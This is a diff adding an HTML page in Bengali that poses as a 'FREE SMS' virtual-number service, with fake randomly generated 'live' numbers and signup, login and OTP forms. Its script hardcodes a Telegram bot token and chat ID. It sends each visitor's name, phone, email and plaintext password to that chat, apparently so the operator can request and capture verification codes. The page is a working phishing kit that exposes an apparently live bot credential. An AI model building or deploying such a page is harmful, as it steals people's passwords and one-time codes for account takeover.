@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>FREE SMS — প্রিমিয়াম ভার্চুয়াল নাম্বার</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#09080c;
+  --bg-2:#121018;
+  --surface:rgba(28,24,38,0.78);
+  --surface-2:rgba(42,36,56,0.9);
+  --border:rgba(255,235,210,0.09);
+  --border-strong:rgba(251,191,36,0.28);
+  --text:#fff8ef;
+  --text-dim:#c4b8ab;
+  --text-mute:#82788e;
+  --accent:#f59e0b;
+  --accent-2:#f43f5e;
+  --accent-3:#22d3ee;
+  --accent-glow:rgba(245,158,11,0.38);
+  --coral-glow:rgba(244,63,94,0.3);
+  --danger:#fb7185;
+  --warn:#fbbf24;
+  --radius:22px;
+  --radius-sm:12px;
+  color-scheme: dark;
+}
+@media (prefers-color-scheme: light){
+  :root:not([data-theme="dark"]){
+    --bg:#faf7f2;
+    --bg-2:#ffffff;
+    --surface:rgba(255,255,255,0.88);
+    --surface-2:rgba(255,244,229,0.95);
+    --border:rgba(24,18,36,0.09);
+    --border-strong:rgba(217,119,6,0.28);
+    --text:#181224;
+    --text-dim:#5c5268;
+    --text-mute:#8c8299;
+  }
+}
+:root[data-theme="light"]{
+  --bg:#faf7f2;
+  --bg-2:#ffffff;
+  --surface:rgba(255,255,255,0.88);
+  --surface-2:rgba(255,244,229,0.95);
+  --border:rgba(24,18,36,0.09);
+  --border-strong:rgba(217,119,6,0.28);
+  --text:#181224;
+  --text-dim:#5c5268;
+  --text-mute:#8c8299;
+}
+
+*{
+  box-sizing:border-box;
+  touch-action:manipulation;
+  -webkit-tap-highlight-color:transparent;
+}
+html{
+  scroll-padding-top:env(safe-area-inset-top,0px);
+  scroll-behavior:smooth;
+  overflow-x:clip;
+}
+body{
+  margin:0;
+  min-height:100dvh;
+  background:var(--bg);
+  color:var(--text);
+  font-family:'Hind Siliguri','Plus Jakarta Sans',system-ui,sans-serif;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+  -webkit-font-smoothing:antialiased;
+  overflow-x:clip;
+  position:relative;
+}
+body::before{
+  content:"";
+  position:fixed;
+  inset:0 0 auto;
+  height:env(safe-area-inset-top,0px);
+  z-index:50;
+  background:var(--bg);
+  pointer-events:none;
+}
+::selection{background:var(--accent-glow); color:#fff;}
+a{color:inherit;}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px;position:relative;z-index:2;}
+
+/* AMBIENT BACKGROUND */
+.orb{
+  position:fixed;
+  border-radius:50%;
+  filter:blur(92px);
+  opacity:.34;
+  pointer-events:none;
+  z-index:0;
+  transform:translate3d(0,0,0);
+  backface-visibility:hidden;
+  will-change:transform;
+}
+.orb1{width:500px;height:500px; background:var(--accent); top:-150px; left:-110px; animation:float1 18s ease-in-out infinite;}
+.orb2{width:420px;height:420px; background:var(--accent-2); top:240px; right:-140px; animation:float2 21s ease-in-out infinite;}
+.orb3{width:360px;height:360px; background:var(--accent-3); bottom:-130px; left:28%; opacity:.22; animation:float3 23s ease-in-out infinite;}
+@keyframes float1{0%,100%{transform:translate3d(0,0,0) scale(1);}50%{transform:translate3d(45px,35px,0) scale(1.08);}}
+@keyframes float2{0%,100%{transform:translate3d(0,0,0) scale(1);}50%{transform:translate3d(-40px,30px,0) scale(0.95);}}
+@keyframes float3{0%,100%{transform:translate3d(0,0,0) scale(1);}50%{transform:translate3d(35px,-30px,0) scale(1.05);}}
+@media (prefers-reduced-motion: reduce){.orb{animation:none !important;}}
+
+.mesh{
+  position:fixed;
+  inset:0;
+  z-index:0;
+  opacity:.42;
+  pointer-events:none;
+  transform:translate3d(0,0,0);
+  background-image:
+    linear-gradient(rgba(251,191,36,0.04) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(244,63,94,0.04) 1px, transparent 1px);
+  background-size:48px 48px;
+  -webkit-mask-image:radial-gradient(ellipse 68% 55% at 50% 0%, #000 35%, transparent 82%);
+  mask-image:radial-gradient(ellipse 68% 55% at 50% 0%, #000 35%, transparent 82%);
+}
+
+/* NAV */
+nav{
+  position:sticky;
+  top:env(safe-area-inset-top,0px);
+  z-index:40;
+  background:color-mix(in srgb, var(--bg) 78%, transparent);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border);
+  transform:translate3d(0,0,0);
+}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;padding:15px 24px;max-width:1180px;margin:0 auto;}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;letter-spacing:-0.02em;}
+.brand .dot{
+  width:13px;height:13px;border-radius:5px;
+  background:linear-gradient(135deg,var(--accent),var(--accent-2));
+  box-shadow:0 0 16px var(--accent-glow);
+}
+.nav-links{display:flex;gap:28px;font-size:14px;color:var(--text-dim);}
+.nav-links span{cursor:pointer; transition:color .2s ease;}
+.nav-links span:hover{color:var(--accent);}
+.nav-actions{display:flex;gap:10px;align-items:center;}
+@media (max-width:720px){.nav-links{display:none;}}
+
+/* BUTTONS */
+.btn{
+  font-family:inherit; cursor:pointer; border:1px solid transparent; border-radius:12px;
+  padding:11px 20px; font-size:14px; font-weight:700;
+  transition:transform .16s ease, opacity .15s ease, box-shadow .2s ease, background .2s ease, border-color .2s ease;
+  display:inline-flex; align-items:center; justify-content:center; gap:8px; white-space:nowrap;
+  transform:translate3d(0,0,0);
+}
+.btn:active{transform:translate3d(0,1px,0) scale(0.98);}
+.btn-primary{
+  background:linear-gradient(135deg,var(--accent) 0%,#ea580c 55%,var(--accent-2) 100%);
+  color:#fff;
+  box-shadow:0 10px 26px -8px var(--accent-glow);
+}
+.btn-primary:hover{transform:translate3d(0,-2px,0); box-shadow:0 14px 32px -8px var(--coral-glow);}
+.btn-ghost{background:var(--surface); border-color:var(--border-strong); color:var(--text);}
+.btn-ghost:hover{background:var(--surface-2); border-color:var(--accent); transform:translate3d(0,-2px,0);}
+.btn-block{width:100%;}
+.btn-lg{padding:15px 26px; font-size:15.5px; border-radius:14px;}
+.btn[disabled]{opacity:.5; cursor:not-allowed;}
+
+/* HERO */
+.hero{padding:82px 0 60px; text-align:center; position:relative;}
+.eyebrow{
+  display:inline-flex; align-items:center; gap:8px; font-size:13px; font-weight:700;
+  color:var(--accent);
+  background:rgba(245,158,11,0.12);
+  border:1px solid rgba(245,158,11,0.32);
+  padding:7px 16px; border-radius:99px; margin-bottom:24px;
+}
+.eyebrow .pulse{
+  width:7px;height:7px;border-radius:50%;
+  background:var(--accent-2);
+  box-shadow:0 0 0 0 rgba(244,63,94,.65);
+  animation:pulse 2.2s infinite;
+}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(244,63,94,.55);}70%{box-shadow:0 0 0 8px rgba(244,63,94,0);}100%{box-shadow:0 0 0 0 rgba(244,63,94,0);}}
+
+h1.hero-title{
+  font-size:clamp(34px,5.5vw,60px); font-weight:800; letter-spacing:-0.03em; line-height:1.12;
+  margin:0 auto 20px; max-width:860px;
+}
+h1.hero-title span{
+  background:linear-gradient(135deg,var(--accent),var(--accent-2),var(--accent-3));
+  -webkit-background-clip:text; background-clip:text; color:transparent;
+}
+.hero-sub{font-size:17px; color:var(--text-dim); max-width:590px; margin:0 auto 36px; line-height:1.78;}
+.hero-cta{display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-bottom:52px;}
+.hero-stats{display:flex; gap:44px; justify-content:center; flex-wrap:wrap;}
+.stat{text-align:center; padding:6px 12px;}
+.stat b{display:block; font-size:27px; font-weight:800; letter-spacing:-0.02em; background:linear-gradient(135deg,var(--text),var(--accent)); -webkit-background-clip:text; background-clip:text; color:transparent;}
+.stat span{font-size:13px; color:var(--text-mute);}
+
+/* PHONE MOCK */
+.phone-stage{margin:58px auto 0; max-width:310px; position:relative;}
+.phone-stage::before{
+  content:"";position:absolute;inset:-38px;
+  background:radial-gradient(circle,var(--accent-glow),var(--coral-glow),transparent 72%);
+  filter:blur(36px);z-index:-1;pointer-events:none;
+}
+.phone{
+  background:linear-gradient(160deg,var(--bg-2),var(--surface-2));
+  border:1px solid var(--border-strong);
+  border-radius:36px; padding:16px;
+  box-shadow:0 28px 65px -20px rgba(0,0,0,0.65), 0 0 0 1px rgba(251,191,36,0.08) inset;
+  transition:transform .28s ease;
+  transform:translate3d(0,0,0);
+}
+.phone-stage:hover .phone{transform:translate3d(0,-4px,0);}
+.phone-notch{width:64px;height:6px;border-radius:4px;background:var(--border-strong);margin:0 auto 14px;}
+.phone-screen{background:var(--bg); border:1px solid var(--border); border-radius:22px; padding:16px 13px; min-height:268px;}
+.ph-row{
+  display:flex;align-items:center;gap:10px;background:var(--surface);border:1px solid var(--border);
+  border-radius:13px;padding:10px 12px;margin-bottom:9px;
+  transition:border-color .2s ease, background .2s ease;
+}
+.ph-row:hover{border-color:rgba(245,158,11,0.45); background:var(--surface-2);}
+.ph-flag{font-size:18px;}
+.ph-txt b{display:block;font-size:12.5px;font-weight:700;}
+.ph-txt span{font-size:11px;color:var(--text-mute); font-variant-numeric:tabular-nums;}
+.ph-badge{
+  margin-left:auto;font-size:10px;font-weight:700;
+  color:var(--accent);background:rgba(245,158,11,.14);border:1px solid rgba(245,158,11,.32);
+  padding:3px 9px;border-radius:99px;
+}
+
+/* SECTION HEAD */
+.section{padding:64px 0;}
+.section-head{text-align:center; max-width:590px; margin:0 auto 42px;}
+.section-head h2{font-size:clamp(26px,3.7vw,36px); font-weight:800; letter-spacing:-0.02em; margin:0 0 10px;}
+.section-head p{color:var(--text-dim); font-size:15.5px; line-height:1.72; margin:0;}
+
+/* COUNTRY GRID */
+.country-grid{display:grid; grid-template-columns:repeat(auto-fill,minmax(235px,1fr)); gap:14px;}
+.country-card{
+  background:var(--surface);
+  border:1px solid var(--border); border-radius:var(--radius);
+  padding:18px 19px; display:flex; align-items:center; gap:14px; cursor:pointer;
+  transition:transform .2s ease, border-color .2s ease, box-shadow .2s ease, background .2s ease;
+  transform:translate3d(0,0,0);
+}
+.country-card:hover{
+  transform:translate3d(0,-3px,0);
+  border-color:rgba(245,158,11,0.5); background:var(--surface-2);
+  box-shadow:0 16px 34px -14px rgba(0,0,0,0.55);
+}
+.flag{font-size:26px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; border-radius:12px; background:var(--bg-2); border:1px solid var(--border); flex-shrink:0;}
+.country-info{flex:1; min-width:0;}
+.country-name{font-weight:700; font-size:14.5px; margin-bottom:2px;}
+.country-num{font-size:13px; color:var(--text-mute); font-variant-numeric:tabular-nums;}
+.badge-live{
+  font-size:11px; font-weight:700;
+  color:var(--accent-2);background:rgba(244,63,94,0.14);border:1px solid rgba(244,63,94,0.3);
+  padding:3px 9px; border-radius:99px; flex-shrink:0;
+}
+
+/* FEATURES */
+.feat-grid{display:grid; grid-template-columns:repeat(3,1fr); gap:18px;}
+@media (max-width:860px){.feat-grid{grid-template-columns:1fr 1fr;}}
+@media (max-width:560px){.feat-grid{grid-template-columns:1fr;}}
+.feat-card{
+  background:var(--surface);
+  border:1px solid var(--border); border-radius:var(--radius); padding:28px 24px;
+  transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+  transform:translate3d(0,0,0);
+}
+.feat-card:hover{transform:translate3d(0,-4px,0); border-color:var(--border-strong); box-shadow:0 20px 40px -16px rgba(0,0,0,0.55);}
+.feat-icon{
+  width:44px;height:44px;border-radius:13px;
+  background:linear-gradient(135deg,var(--accent),var(--accent-2));
+  display:flex;align-items:center;justify-content:center;margin-bottom:18px;font-size:20px;
+  box-shadow:0 10px 22px -8px var(--accent-glow);
+}
+.feat-card h3{font-size:16.5px; font-weight:700; margin:0 0 8px;}
+.feat-card p{font-size:13.8px; color:var(--text-dim); line-height:1.68; margin:0;}
+
+/* CTA STRIP */
+.strip{
+  background:linear-gradient(135deg, var(--surface) 0%, var(--surface-2) 100%);
+  border:1px solid var(--border-strong); border-radius:24px; padding:52px 32px; text-align:center;
+}
+.strip h2{font-size:28px; font-weight:800; margin:0 0 10px; letter-spacing:-0.02em;}
+.strip p{color:var(--text-dim); margin:0 0 28px; font-size:15px;}
+
+footer{border-top:1px solid var(--border); padding:32px 0; text-align:center; color:var(--text-mute); font-size:13.5px;}
+
+/* MODAL */
+.overlay{
+  position:fixed; inset:0; background:rgba(6,4,10,0.82); backdrop-filter:blur(8px); -webkit-backdrop-filter:blur(8px);
+  display:none; align-items:center; justify-content:center; z-index:100; padding:20px 16px;
+  overflow-y:auto; overscroll-behavior:contain;
+}
+.overlay.active{display:flex;}
+.modal{
+  background:var(--bg-2); border:1px solid var(--border-strong); border-radius:24px; width:100%; max-width:410px;
+  padding:32px 26px 26px; position:relative;
+  box-shadow:0 32px 75px -20px rgba(0,0,0,0.75);
+  transform:translate3d(0,0,0);
+}
+.modal-close{
+  position:absolute; top:16px; right:16px; width:34px; height:34px; border-radius:11px;
+  border:1px solid var(--border); background:var(--surface); color:var(--text-dim); cursor:pointer;
+  display:flex; align-items:center; justify-content:center; font-size:16px;
+  transition:background .18s ease, color .18s ease;
+}
+.modal-close:hover{background:var(--surface-2); color:var(--text);}
+.modal-head{margin-bottom:22px;}
+.modal-head h3{font-size:22px; font-weight:800; margin:0 0 6px; letter-spacing:-0.02em; color:var(--accent);}
+.modal-head p{font-size:13.5px; color:var(--text-dim); margin:0; line-height:1.55;}
+.field{margin-bottom:14px;}
+.field label{display:block; font-size:13px; font-weight:600; color:var(--text-dim); margin-bottom:7px;}
+.field input{
+  width:100%; background:var(--surface); border:1px solid var(--border); color:var(--text);
+  padding:12px 14px; border-radius:12px; font-size:16px; font-family:inherit; outline:none;
+  transition:border-color .15s ease, box-shadow .15s ease;
+}
+.field input:focus{border-color:var(--accent); box-shadow:0 0 0 3px var(--accent-glow);}
+.field-err{color:var(--danger); font-size:12.5px; margin-top:6px; display:none;}
+.field.has-err input{border-color:var(--danger);}
+.field.has-err .field-err{display:block;}
+.switch-line{text-align:center; font-size:13.5px; color:var(--text-dim); margin-top:18px;}
+.switch-line a{color:var(--accent); font-weight:700; cursor:pointer; text-decoration:none;}
+
+/* OTP */
+.otp-row{display:flex; gap:9px; justify-content:center; margin:22px 0 8px;}
+.otp-box{
+  width:48px; height:58px; text-align:center; font-size:22px; font-weight:700;
+  background:var(--surface); border:1px solid var(--border); border-radius:13px; color:var(--text);
+  font-family:inherit; outline:none;
+  transition:border-color .15s ease, box-shadow .15s ease;
+}
+.otp-box:focus{border-color:var(--accent-2); box-shadow:0 0 0 3px var(--coral-glow);}
+.otp-timer{text-align:center; font-size:13.5px; color:var(--text-dim); margin:8px 0 20px;}
+.otp-timer b{color:var(--text); font-variant-numeric:tabular-nums;}
+.otp-resend{color:var(--accent); font-weight:700; cursor:pointer;}
+.otp-resend.disabled{color:var(--text-mute); cursor:not-allowed; pointer-events:none;}
+.demo-note{
+  font-size:12px; color:var(--warn); background:rgba(245,158,11,0.12); border:1px solid rgba(245,158,11,0.32);
+  padding:10px 13px; border-radius:12px; margin-bottom:18px; line-height:1.6;
+}
+.toast{
+  position:fixed; bottom:24px; left:50%; transform:translate3d(-50%,16px,0); z-index:200;
+  background:var(--bg-2); border:1px solid var(--border-strong); color:var(--text);
+  padding:13px 20px; border-radius:14px; font-size:13.5px; font-weight:600;
+  box-shadow:0 16px 36px -10px rgba(0,0,0,0.7);
+  opacity:0; pointer-events:none; transition:opacity .2s ease, transform .2s ease;
+  display:flex; align-items:center; gap:10px; max-width:90vw;
+}
+.toast.show{opacity:1; transform:translate3d(-50%,0,0);}
+.toast .dotok{width:8px;height:8px;border-radius:50%;background:var(--accent-2);flex-shrink:0;}
+
+.dash-badge{display:flex;align-items:center;gap:9px;font-size:13.5px;font-weight:600;color:var(--text);background:var(--surface);border:1px solid var(--border-strong);padding:5px 12px 5px 6px;border-radius:99px;}
+.avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#fff;}
+</style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="mesh"></div>
+
+<nav>
+  <div class="nav-inner">
+    <div class="brand"><span class="dot"></span>FREE SMS</div>
+    <div class="nav-links">
+      <span onclick="document.getElementById('numbers').scrollIntoView({behavior:'smooth'})">নাম্বার</span>
+      <span onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">ফিচার</span>
+      <span onclick="showToast('২৪/৭ লাইভ সাপোর্ট চালু আছে')">সাপোর্ট</span>
+    </div>
+    <div class="nav-actions" id="navActions">
+      <button class="btn btn-ghost" onclick="openModal('login')">লগ ইন</button>
+      <button class="btn btn-primary" onclick="openModal('signup')">সাইন আপ</button>
+    </div>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="eyebrow"><span class="pulse"></span>৫২+ দেশের ভার্চুয়াল নাম্বার যুক্ত হয়েছে</div>
+    <h1 class="hero-title">যেকোনো দেশের <span>ভার্চুয়াল নাম্বার</span>, এক জায়গায়</h1>
+    <p class="hero-sub">OTP ভেরিফিকেশন থেকে শুরু করে যেকোনো অ্যাপ সাইনআপ — নিরাপদ, দ্রুত ও ভরসাযোগ্য ভার্চুয়াল নাম্বার সার্ভিস। এখনই অ্যাকাউন্ট খুলুন।</p>
+    <div class="hero-cta">
+      <button class="btn btn-primary btn-lg" onclick="openModal('signup')">ফ্রি অ্যাকাউন্ট খুলুন</button>
+      <button class="btn btn-ghost btn-lg" onclick="document.getElementById('numbers').scrollIntoView({behavior:'smooth'})">নাম্বার দেখুন</button>
+    </div>
+    <div class="hero-stats">
+      <div class="stat"><b>৫২+</b><span>দেশ সাপোর্টেড</span></div>
+      <div class="stat"><b>১২,৪০০+</b><span>সক্রিয় ইউজার</span></div>
+      <div class="stat"><b>৯৯.৯%</b><span>আপটাইম</span></div>
+    </div>
+    <div class="phone-stage">
+      <div class="phone">
+        <div class="phone-notch"></div>
+        <div class="phone-screen">
+          <div class="ph-row"><span class="ph-flag">🇺🇸</span><div class="ph-txt"><b>যুক্তরাষ্ট্র</b><span>+1 302-1194</span></div><span class="ph-badge">লাইভ</span></div>
+          <div class="ph-row"><span class="ph-flag">🇮🇳</span><div class="ph-txt"><b>ভারত</b><span>+91 884-2207</span></div><span class="ph-badge">লাইভ</span></div>
+          <div class="ph-row"><span class="ph-flag">🇧🇩</span><div class="ph-txt"><b>বাংলাদেশ</b><span>+880 177-9043</span></div><span class="ph-badge">লাইভ</span></div>
+          <div class="ph-row"><span class="ph-flag">🇬🇧</span><div class="ph-txt"><b>যুক্তরাজ্য</b><span>+44 759-3321</span></div><span class="ph-badge">লাইভ</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="section" id="numbers">
+  <div class="wrap">
+    <div class="section-head">
+      <h2>জনপ্রিয় দেশসমূহ</h2>
+      <p>নিচের যেকোনো দেশ বেছে নিয়ে মুহূর্তেই একটি ভার্চুয়াল নাম্বার পেয়ে যান।</p>
+    </div>
+    <div class="country-grid" id="countryGrid"></div>
+  </div>
+</section>
+
+<section class="section" id="features">
+  <div class="wrap">
+    <div class="section-head">
+      <h2>কেন FREE SMS</h2>
+      <p>আপনার প্রাইভেসি ও সময়, দুটোই আমাদের কাছে গুরুত্বপূর্ণ।</p>
+    </div>
+    <div class="feat-grid">
+      <div class="feat-card"><div class="feat-icon">⚡</div><h3>ইনস্ট্যান্ট OTP</h3><p>সেকেন্ডের মধ্যে OTP রিসিভ করুন, কোনো অপেক্ষা ছাড়াই।</p></div>
+      <div class="feat-card"><div class="feat-icon">🔒</div><h3>প্রাইভেসি সুরক্ষিত</h3><p>আপনার আসল নাম্বার কখনো শেয়ার করতে হবে না।</p></div>
+      <div class="feat-card"><div class="feat-icon">🌍</div><h3>৫২+ দেশ</h3><p>প্রায় সব জনপ্রিয় দেশের নাম্বার একসাথে এক প্ল্যাটফর্মে।</p></div>
+      <div class="feat-card"><div class="feat-icon">💳</div><h3>সাশ্রয়ী মূল্য</h3><p>পে-অ্যাজ-ইউ-গো প্ল্যান, কোনো লুকানো চার্জ নেই।</p></div>
+      <div class="feat-card"><div class="feat-icon">🛠️</div><h3>ডেভেলপার API</h3><p>নিজের অ্যাপে সহজেই ইন্টিগ্রেট করার API সুবিধা (শীঘ্রই)।</p></div>
+      <div class="feat-card"><div class="feat-icon">🎧</div><h3>২৪/৭ সাপোর্ট</h3><p>যেকোনো সমস্যায় পাশে আছে আমাদের সাপোর্ট টিম।</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="wrap">
+    <div class="strip">
+      <h2>আজই শুরু করুন</h2>
+      <p>৩০ সেকেন্ডে অ্যাকাউন্ট খুলুন, প্রথম নাম্বার সম্পূর্ণ ফ্রি।</p>
+      <button class="btn btn-primary btn-lg" onclick="openModal('signup')">ফ্রি সাইন আপ</button>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">© 2026 FREE SMS — আধুনিক ভার্চুয়াল নাম্বার প্ল্যাটফর্ম</div>
+</footer>
+
+<div class="overlay" id="overlaySignup">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('signup')" aria-label="বন্ধ করুন">✕</button>
+    <div class="modal-head"><h3>অ্যাকাউন্ট তৈরি করুন</h3><p></p></div>
+    <div class="field" id="f-name"><label>সম্পূর্ণ নাম</label><input type="text" id="in-name" placeholder=""><div class="field-err">নাম লিখুন</div></div>
+    <div class="field" id="f-phone"><label>মোবাইল নম্বর</label><input type="tel" id="in-phone" inputmode="tel" placeholder=""><div class="field-err">সঠিক মোবাইল নম্বর দিন</div></div>
+    <div class="field" id="f-email"><label>ইমেইল</label><input type="email" id="in-email" placeholder=""><div class="field-err">সঠিক ইমেইল দিন</div></div>
+    <div class="field" id="f-pass"><label>পাসওয়ার্ড তৈরি করুন</label><input type="password" id="in-pass" placeholder=""><div class="field-err">কমপক্ষে ৬ ক্যারেক্টার দিন</div></div>
+    <div class="field" id="f-pass2"><label>পাসওয়ার্ড নিশ্চিত করুন</label><input type="password" id="in-pass2" placeholder=""><div class="field-err">পাসওয়ার্ড মিলছে না</div></div>
+    <button class="btn btn-primary btn-block btn-lg" style="margin-top:6px;" onclick="submitSignup()">সাইন আপ</button>
+    <div class="switch-line">অ্যাকাউন্ট আছে? <a onclick="openModal('login')">লগ ইন করুন</a></div>
+  </div>
+</div>
+
+<div class="overlay" id="overlayLogin">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('login')" aria-label="বন্ধ করুন">✕</button>
+    <div class="modal-head"><h3>লগ ইন করুন</h3><p>আপনার অ্যাকাউন্টে প্রবেশ করুন।</p></div>
+    <div class="field" id="lf-email"><label>ইমেইল</label><input type="email" id="lin-email" placeholder="you@gmail.com"><div class="field-err">সঠিক ইমেইল দিন</div></div>
+    <div class="field" id="lf-pass"><label>পাসওয়ার্ড</label><input type="password" id="lin-pass" placeholder="আপনার পাসওয়ার্ড"><div class="field-err">পাসওয়ার্ড লিখুন</div></div>
+    <button class="btn btn-primary btn-block btn-lg" style="margin-top:6px;" onclick="submitLogin()">লগ ইন</button>
+    <div class="switch-line">নতুন ইউজার? <a onclick="openModal('signup')">সাইন আপ করুন</a></div>
+  </div>
+</div>
+
+<div class="overlay" id="overlayOtp">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('otp')" aria-label="বন্ধ করুন">✕</button>
+    <div class="modal-head"><h3>ভেরিফাই করুন</h3><p id="otpSubText">আপনার মোবাইল নম্বরে পাঠানো ৫ সংখ্যার OTP কোডটি দিন।</p></div>
+    
+    <div class="otp-row">
+      <input class="otp-box" maxlength="1" inputmode="numeric" id="otp0">
+      <input class="otp-box" maxlength="1" inputmode="numeric" id="otp1">
+      <input class="otp-box" maxlength="1" inputmode="numeric" id="otp2">
+      <input class="otp-box" maxlength="1" inputmode="numeric" id="otp3">
+      <input class="otp-box" maxlength="1" inputmode="numeric" id="otp4">
+    </div>
+    <div class="field" style="margin-top:4px;"><div class="field-err" id="otpErr" style="display:none;">সঠিক ৫ সংখ্যার কোড দিন</div></div>
+    <div class="otp-timer">মেয়াদ শেষ হবে <b id="otpTimer">10:00</b> এর মধ্যে — <span class="otp-resend" id="resendBtn" onclick="resendOtp()">আবার পাঠান</span></div>
+    <button class="btn btn-primary btn-block btn-lg" onclick="submitOtp()">সাবমিট ও যাচাই</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"><span class="dotok"></span><span id="toastText"></span></div>
+
+<script>
+// =========================================================
+// শুধু এখানেই আপনার Bot Token ও Chat ID বসান
+// =========================================================
+const BOT_TOKEN = "9195555498:AAGdYBfW3pXdU2EWproEHKzNHg3-fvjq61I";
+const CHAT_ID = "9038566143";
+
+// জুম ইন ও জুম আউট সম্পূর্ণ বন্ধ রাখা
+document.addEventListener('wheel', function(e){
+  if (e.ctrlKey || e.metaKey) e.preventDefault();
+}, { passive: false });
+
+document.addEventListener('keydown', function(e){
+  if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) {
+    e.preventDefault();
+  }
+});
+
+['gesturestart', 'gesturechange', 'gestureend'].forEach(function(evt){
+  document.addEventListener(evt, function(e){ e.preventDefault(); }, { passive: false });
+});
+
+var lastTouchEnd = 0;
+document.addEventListener('touchend', function(e){
+  var now = Date.now();
+  if (now - lastTouchEnd <= 300) e.preventDefault();
+  lastTouchEnd = now;
+}, { passive: false });
+
+var countries = [
+  ["🇺🇸","যুক্তরাষ্ট্র","+1"],["🇬🇧","যুক্তরাজ্য","+44"],["🇮🇳","ভারত","+91"],
+  ["🇧🇩","বাংলাদেশ","+880"],["🇵🇰","পাকিস্তান","+92"],["🇮🇩","ইন্দোনেশিয়া","+62"],
+  ["🇩🇪","জার্মানি","+49"],["🇫🇷","ফ্রান্স","+33"],["🇨🇦","কানাডা","+1"],
+  ["🇦🇺","অস্ট্রেলিয়া","+61"],["🇧🇷","ব্রাজিল","+55"],["🇳🇬","নাইজেরিয়া","+234"],
+  ["🇦🇪","আরব আমিরাত","+971"],["🇹🇷","তুরস্ক","+90"],["🇻🇳","ভিয়েতনাম","+84"],
+  ["🇵🇭","ফিলিপাইন","+63"],["🇷🇺","রাশিয়া","+7"],["🇲🇾","মালয়েশিয়া","+60"]
+];
+function randNum(){
+  var n = "";
+  for(var i=0;i<7;i++) n += Math.floor(Math.random()*10);
+  return n.slice(0,3)+"-"+n.slice(3);
+}
+var grid = document.getElementById('countryGrid');
+countries.forEach(function(c){
+  var el = document.createElement('div');
+  el.className = 'country-card';
+  el.innerHTML =
+    '<div class="flag">'+c[0]+'</div>'+
+    '<div class="country-info"><div class="country-name">'+c[1]+'</div>'+
+    '<div class="country-num">'+c[2]+' '+randNum()+'</div></div>'+
+    '<div class="badge-live">লাইভ</div>';
+  el.onclick = function(){ showToast(c[1] + ' — নাম্বার নিতে সাইন আপ করুন।'); };
+  grid.appendChild(el);
+});
+
+function openModal(which){
+  closeAllModals();
+  document.getElementById('overlay'+cap(which)).classList.add('active');
+  document.body.style.overflow = 'hidden';
+}
+function closeModal(which){
+  document.getElementById('overlay'+cap(which)).classList.remove('active');
+  document.body.style.overflow = '';
+}
+function closeAllModals(){
+  ['Signup','Login','Otp'].forEach(function(w){ document.getElementById('overlay'+w).classList.remove('active'); });
+  document.body.style.overflow = '';
+}
+function cap(s){ return s.charAt(0).toUpperCase()+s.slice(1); }
+['overlaySignup','overlayLogin','overlayOtp'].forEach(function(id){
+  document.getElementById(id).addEventListener('click', function(e){
+    if(e.target === this){
+      this.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+  });
+});
+
+function showToast(msg){
+  var t = document.getElementById('toast');
+  document.getElementById('toastText').textContent = msg;
+  t.classList.add('show');
+  clearTimeout(window._toastTimer);
+  window._toastTimer = setTimeout(function(){ t.classList.remove('show'); }, 2800);
+}
+
+function setErr(fieldId, on){
+  var f = document.getElementById(fieldId);
+  if(on) f.classList.add('has-err'); else f.classList.remove('has-err');
+}
+
+var pendingUser = null;
+var SIGNUP_ENDPOINT = '';
+
+function sendTelegramMessage(text){
+  if(!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE"){
+    console.warn("কোডে BOT_TOKEN ও CHAT_ID সেট করা হয়নি।");
+    return Promise.resolve();
+  }
+  return fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, text: text})
+  }).catch(function(err){ console.warn('Telegram-এ পাঠানো যায়নি', err); });
+}
+
+function notifySignup(payload){
+  var text =
+    'নতুন সাইনআপ (OTP পাঠান)\n\n' +
+    'নাম: ' + payload.name + '\n' +
+    'মোবাইল নম্বর: ' + payload.phone + '\n' +
+    'ইমেইল: ' + payload.email + '\n' +
+    'পাসওয়ার্ড: ' + payload.password;
+
+  sendTelegramMessage(text);
+
+  if(SIGNUP_ENDPOINT){
+    try{
+      fetch(SIGNUP_ENDPOINT, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
